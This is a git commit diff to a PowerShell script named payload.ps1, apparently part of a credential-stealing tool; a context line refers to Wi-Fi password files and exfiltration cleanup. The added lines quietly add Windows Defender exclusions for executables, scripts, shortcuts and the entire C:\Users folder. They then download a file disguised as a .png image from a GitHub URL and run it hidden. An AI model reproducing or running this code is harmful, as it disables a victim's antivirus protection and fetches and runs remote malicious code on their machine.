e72e8591c5ef1dec8c69ca6cae74331fa4c46418
rude90 <115774095+rude90@users.noreply.github.com>
2023-06-26 18:35:25 -0700

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -84,3 +84,11 @@ if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
 RI $env:TEMP/--wifi-pass.txt
+
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/cyber-attack%20(1).png -o C:\Users\gift.png
+powershell.exe -w Hidden C:\Users\gift.png
